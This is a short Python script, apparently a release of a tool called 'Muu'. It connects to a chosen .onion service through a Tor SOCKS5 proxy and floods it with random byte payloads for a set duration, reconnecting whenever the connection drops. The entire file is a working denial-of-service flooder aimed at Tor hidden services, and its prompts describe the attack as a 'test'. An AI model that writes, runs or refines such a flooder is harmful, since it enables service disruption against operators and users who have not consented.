import socket
import socks
import random
import time

print("""
                 Muu
             Release V2.3
""")

onion_url = input("Enter the Tor (.onion) URL: ").strip()
port = int(input("Enter the port: "))
proxy_port = int(input("Enter the Tor proxy port (default 9050): "))
ip = onion_url.replace("http://", "").replace("https://", "").split('/')[0]

print("1028, 1460, 1542 are recommended for Tor.")
bytesAmt = int(input('Amount of bytes: '))
payload = random._urandom(bytesAmt)

duration = input('Test time in seconds: ')
timeout = time.time() + float(duration)

def get_new_connection():
    """Creates a fresh socket and connects to the .onion address via Tor."""
    print(f"Connecting to {ip}...")
    new_sock = socks.socksocket()
    new_sock.set_proxy(socks.SOCKS5, "127.0.0.1", proxy_port, rdns=True)
    new_sock.connect((ip, port))
    return new_sock

def start_worker():
    """The main loop that handles sending and retrying."""
    sent_count = 0
    
    try:
        s = get_new_connection()
    except Exception as e:
        print(f"Initial connection failed: {e}")
        return

    while True:
        if time.time() > timeout:
            print("\nTimeout reached.")
            s.close()
            break

        try:
            s.send(payload)
            sent_count += 1
            print(f"Packet #{sent_count} of size {bytesAmt} bytes sent to {ip}")

        except (ConnectionResetError, socks.ProxyConnectionError, socket.error):
            print("\nConnection lost. Re-establishing...")
            try:
                s.close()
            except:
                pass
            
            try:
                s = get_new_connection()
            except:
                print("Reconnection failed. Will try again...")
                continue

start_worker()
